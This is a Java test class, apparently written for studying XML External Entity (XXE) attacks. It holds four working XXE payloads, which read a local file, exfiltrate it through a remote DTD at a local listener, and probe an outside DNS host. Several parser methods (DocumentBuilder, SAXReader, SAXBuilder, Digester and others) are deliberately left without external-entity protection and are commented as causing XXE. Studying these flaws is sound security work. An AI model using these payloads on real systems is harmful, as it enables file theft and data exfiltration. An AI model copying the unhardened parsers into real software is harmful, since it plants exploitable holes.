package com.test.local;

import org.apache.commons.digester3.Digester;
import org.dom4j.DocumentException;
import org.dom4j.io.SAXReader;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.DefaultHandler;
import org.xml.sax.helpers.XMLReaderFactory;

import javax.xml.parsers.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;

public class DocBuilder {
    public static void main(String[] args) throws ParserConfigurationException, IOException, SAXException {
        String xml1 = "<?xml1 version='1.0'?>" +
                "<!DOCTYPE note [<!ENTITY xxe SYSTEM 'file:///D:/test.txt'>]>" +
                "<note>" +
                "<to>&xxe;</to>" +
                "<from>webgoat</from>" +
                "</note>";

        // 报错抛出数据
        String xml2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<!DOCTYPE convert [\n" +
                "<!ELEMENT convert ANY>\n" +
                "<!ENTITY % remote SYSTEM \"http://127.0.0.1:7777/1.dtd\">\n" +
                "%remote;%int;%send;\n" +
                "]>";

        //DNS探测
        String xml3 = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<!DOCTYPE convert [\n" +
                "<!ELEMENT convert ANY>\n" +
                "<!ENTITY % remote SYSTEM \"http://xxe.goykymzpem.dgrh3.cn\">\n" +
                "%remote;\n" +
                "]>";

        // 通过CDATA，读取包含特殊符号的文本
        String xml4 = "<?xml version=\"1.0\" encoding=\"utf-8\"?> \n" +
                "<!DOCTYPE roottag [\n" +
                "<!ENTITY % start \"<![CDATA[\">   \n" +
                "<!ENTITY % goodies SYSTEM \"file:///D:/test.txt\">  \n" +
                "<!ENTITY % end \"]]>\">  \n" +
                "<!ENTITY % dtd SYSTEM \"http://127.0.0.1:7777/2.dtd\"> \n" +
                "%dtd; ]> \n" +
                "\n" +
                "<roottag>&all;</roottag>";

        docBuilder(xml4);
    }

    public static void docBuilder(String xml) throws ParserConfigurationException, IOException, SAXException {
        InputStream inputStream = new java.io.ByteArrayInputStream(xml.getBytes());

        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();

        // 漏洞：未禁用外部实体
        Document doc = builder.parse(inputStream);

        // 遍历xml节点name和value
        StringBuffer buf = new StringBuffer();
        NodeList rootNodeList = doc.getChildNodes();
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList child = rootNode.getChildNodes();
            for (int j = 0; j < child.getLength(); j++) {
                Node node = child.item(j);
                buf.append(node.getNodeName() + ": " + node.getTextContent() + "\n");
            }
        }
        System.out.println(buf.toString());
//        System.out.println(doc);
        System.out.println("Document parsed successfully");
    }

    public static void xmlReader(String xml) throws ParserConfigurationException, IOException, SAXException {
        XMLReader xmlReader = XMLReaderFactory.createXMLReader();
        xmlReader.parse(new InputSource(new StringReader(xml)));
    }

    public static void SAXBuilder(String xml) throws ParserConfigurationException, IOException, SAXException, JDOMException {
        SAXBuilder builder = new SAXBuilder();
        // org.jdom2.Document document
        builder.build(new InputSource(new StringReader(xml)));  // cause xxe
    }

    public static void SAXReader(String xml) throws DocumentException {
        SAXReader reader = new SAXReader();
        // org.dom4j.Document document
        reader.read(new InputSource(new StringReader(xml))); // cause xxe
    }

    public static void SAXParser(String xml) throws ParserConfigurationException, SAXException, IOException {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        SAXParser parser = spf.newSAXParser();
        parser.parse(new InputSource(new StringReader(xml)), new DefaultHandler());
    }

    public static void Digester(String xml) throws IOException, SAXException {
        Digester digester = new Digester();
        Object parse = digester.parse(new StringReader(xml));// parse xml
    }

    public static void docBuilderXinclude(String xml) throws ParserConfigurationException, IOException, SAXException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setXIncludeAware(true);   // 支持XInclude
        dbf.setNamespaceAware(true);  // 支持XInclude
        DocumentBuilder db = dbf.newDocumentBuilder();
        StringReader sr = new StringReader(xml);
        InputSource is = new InputSource(sr);
        Document document = db.parse(is);  // parse xml

        NodeList rootNodeList = document.getChildNodes();
    }


}
